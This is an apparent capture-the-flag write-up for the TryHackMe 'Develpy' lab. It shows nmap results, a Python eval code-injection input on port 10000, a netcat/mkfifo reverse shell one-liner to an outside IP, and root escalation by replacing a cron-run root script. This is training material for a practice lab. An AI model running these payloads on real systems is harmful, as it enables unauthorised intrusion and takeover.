THIS IS A WRITEUP FOR DEVELPY ROOM IN TRYHACKME


NMAP RESULTS

22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 78:c4:40:84:f4:42:13:8e:79:f8:6b:e4:6d:bf:d4:46 (RSA)
|   256 25:9d:f3:29:a2:62:4b:24:f2:83:36:cf:a7:75:bb:66 (ECDSA)
|_  256 e7:a0:07:b0:b9:cb:74:e9:d6:16:7d:7a:67:fe:c1:1d (ED25519)
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):

*lets check out port 10000
*there is some python script running
*lets check if we can connect to this port with netcat
*and it does work
*nc 10.10.250.180 10000

        Private 0days

 Please enther number of exploits to send??: 


now we can check if we can exploit by giving inputs
and yes it worked
 Please enther number of exploits to send??: eval('__import__("os").system("pwd")')
/home/king

time to spawn a rev shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.162.105 1244 >/tmp/f


we got the shell
 after stablising it i found some scripts in the home directory

time to check crontab
there i found root.sh is running as root every minute
but we dont have permission to edit it
but we can remove it and create a new script with same name and a rev shell on it
boom... after a min we got root shell


























